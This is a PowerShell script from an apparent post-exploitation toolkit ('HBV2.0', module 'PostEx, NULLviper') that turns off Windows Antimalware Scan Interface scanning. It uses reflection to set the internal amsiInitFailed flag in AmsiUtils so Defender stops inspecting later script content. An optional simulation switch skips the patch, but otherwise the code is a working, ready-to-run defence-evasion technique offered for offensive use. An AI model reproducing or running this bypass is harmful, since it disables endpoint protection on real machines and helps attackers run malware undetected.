<#
.SYNOPSIS
    HBV2.0 - AMSI Bypass via Reflection
.DESCRIPTION
    Patches the AMSI context in memory to bypass Defender scanning.
.NOTES
    Module: PostEx, NULLviper
    Credits: SpecterOps + rastamouse + modded for HBV2.0
#>

if ($env:SimulationMode -eq "True") {
    Write-Host "[SIM] AMSI bypass simulated." -ForegroundColor Yellow
    return
}

Write-Host "[*] Attempting AMSI bypass..." -ForegroundColor Cyan

$signature = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$field = $signature.GetField('amsiInitFailed','NonPublic,Static')
$field.SetValue($null,$true)

Write-Host "[+] AMSI bypassed in memory." -ForegroundColor Green